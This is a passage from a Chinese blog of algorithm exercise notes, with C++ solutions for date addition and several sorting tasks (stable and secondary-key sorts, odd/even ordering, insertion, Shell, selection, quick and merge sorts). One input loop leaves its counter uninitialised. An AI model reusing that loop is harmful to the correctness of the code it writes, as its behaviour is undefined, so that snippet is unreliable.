class="number">29</span>;</span><br><span class="line"><span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">1</span>, i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(d &gt; f[i])&#123;</span><br><span class="line">d -= f[i];</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-%02d-%02d\n&quot;</span>, y, i, d);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="日期累加">日期累加</h3><p>设计一个程序能计算一个日期加上若干天后是什么日期。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m;</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="type">int</span> y, m, d, n;</span><br><span class="line">cin &gt;&gt; y &gt;&gt; m &gt;&gt; d &gt;&gt; n;</span><br><span class="line">d += n;</span><br><span class="line"><span class="type">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line"><span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line"><span class="type">int</span> y_ = y;</span><br><span class="line"><span class="keyword">while</span>(d &gt; f[m])&#123;</span><br><span class="line">d -= f[m];</span><br><span class="line">m ++;</span><br><span class="line"><span class="keyword">if</span>(m &gt; <span class="number">12</span>)&#123;</span><br><span class="line">m -= <span class="number">12</span>;</span><br><span class="line">y ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y_ != y)&#123;</span><br><span class="line">y_ = y;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line"><span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-%02d-%02d\n&quot;</span>, y, m, d);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="排序-1">排序</h2><p>sort和stable_sort</p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230613121222002.png" alt="image-20230613121222002"></p><h3 id="成绩排序">成绩排序</h3><p>题目：输入任意（用户，成绩）序列，可以获得成绩从高到低或从低到高的排列,相同成绩都按先录入排列在前的规则处理。</p><p>两种办法：</p><ol type="1"><li><p>用stable_sort</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> grade;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">desc</span><span class="params">(<span class="keyword">struct</span> student s1, <span class="keyword">struct</span> student s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> s1.grade &gt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">asc</span><span class="params">(<span class="keyword">struct</span> student s1, <span class="keyword">struct</span> student s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> s1.grade &lt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, order;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; order)&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span> stu[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; stu[i].name &gt;&gt; stu[i].grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(order == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">stable_sort</span>(stu, stu+n, desc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">stable_sort</span>(stu, stu+n, asc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; stu[i].grade &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>二级排序</p><p>设置一个id，成绩相同id小的在上</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> grade, id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">desc</span><span class="params">(<span class="keyword">struct</span> student s1, <span class="keyword">struct</span> student s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(s1.grade == s2.grade) <span class="keyword">return</span> s1.id &lt; s2.id;</span><br><span class="line"><span class="keyword">return</span> s1.grade &gt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">asc</span><span class="params">(<span class="keyword">struct</span> student s1, <span class="keyword">struct</span> student s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(s1.grade == s2.grade) <span class="keyword">return</span> s1.id &lt; s2.id;</span><br><span class="line"><span class="keyword">return</span> s1.grade &lt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, order;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; order)&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span> stu[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; stu[i].name &gt;&gt; stu[i].grade;</span><br><span class="line">stu[i].id = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(order == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">sort</span>(stu, stu+n, desc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">sort</span>(stu, stu+n, asc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; stu[i].grade &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="排序-2">排序</h3><p>输入n个数进行排序，要求先按奇偶后按从小到大的顺序排序。</p><p>也有两种办法，一个是奇偶分开排，一个是二级排序，把奇数排在偶数前面；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="type">int</span> m[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;, odd[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;, even[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> idx1 = <span class="number">0</span>, idx2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i] % <span class="number">2</span> == <span class="number">0</span>) even[idx1++] = m[i];</span><br><span class="line"><span class="keyword">else</span> odd[idx2++] = m[i]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(odd, odd+idx2);</span><br><span class="line"><span class="built_in">sort</span>(even, even+idx1);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx2; i++)&#123;</span><br><span class="line">cout &lt;&lt; odd[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx1; i++)&#123;</span><br><span class="line">cout &lt;&lt; even[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分级：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compare</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a % <span class="number">2</span> == b % <span class="number">2</span>) <span class="keyword">return</span> a &lt; b;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">return</span> (a%<span class="number">2</span>) &gt; (b%<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="type">int</span> m[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(m, m+n, compare);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cout &lt;&lt; m[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="排序2">排序2</h3><p>编写程序实现直接插入排序、希尔排序（d=5)、直接选择排序、快速排序和二路归并排序算法。</p><p>直接插入排序后的结果 一趟希尔排序后的结果 直接选择排序后的结果快速排序后的结果 一趟二路归并排序后的结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp = arr[i];</span><br><span class="line"><span class="type">int</span> j = i - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>((j &gt;= <span class="number">0</span>) &amp;&amp; (arr[j] &gt; tmp))&#123;</span><br><span class="line">arr[j+<span class="number">1</span>] = arr[j];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">arr[j+<span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell_sort_onetime</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> gap = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = gap; i &lt; len; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp = arr[i], j;</span><br><span class="line"><span class="keyword">for</span>(j = i - gap; j &gt;=<span class="number">0</span> &amp;&amp; arr[j] &gt; tmp; j -= gap)&#123;</span><br><span class="line">arr[j + gap] = arr[j];</span><br><span class="line">&#125;</span><br><span class="line">arr[j + gap] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">select_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">idx = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[j] &lt; arr[idx]) idx = j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> tmp = arr[i];</span><br><span class="line">arr[i] = arr[idx];</span><br><span class="line">arr[idx] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> i = l, j = r, x = arr[l];</span><br><span class="line"><span class="keyword">while</span>(i &lt; j)&#123;</span><br><span class="line"><span class="keyword">while</span>(arr[j] &gt;= x &amp;&amp;  i &lt; j) j--;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j) arr[i++] = arr[j];</span><br><span class="line"><span class="keyword">while</span>(arr[i] &lt;= x &amp;&amp; i &lt; j) i++;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j) arr[j--] = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">arr[i] = x;</span><br><span class="line"><span class="built_in">quick_sort</span>(arr, l, i - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">quick_sort</span>(arr, j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">start_quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="built_in">quick_sort</span>(arr, <span class="number">0</span>, len<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">twomerge_onetime</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len<span class="number">-1</span>; i += <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[i] &gt; arr[i+<span class="number">1</span>]) <span class="built_in">swap</span>(arr[i], arr[i+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> m[n], tmp[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接插入排序</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">insert_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line"><span class="comment">//希尔排序</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">shell_sort_onetime</span>(tmp, n);</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接选择排序</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">select_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line"><span class="comment">//快速排序</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">start_quick_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">twomerge_onetime</span>(tmp, n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="国名排序">国名排序</h3><p>第一行为一个n（n&lt;=100）表示n个国家，第２行到第n＋１行分别为n个国家的名字．</p><p>输出n个国家按字典顺序的排列．</p><p>字符串比较用strcmp，但是需要用结构体，不能用二维数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 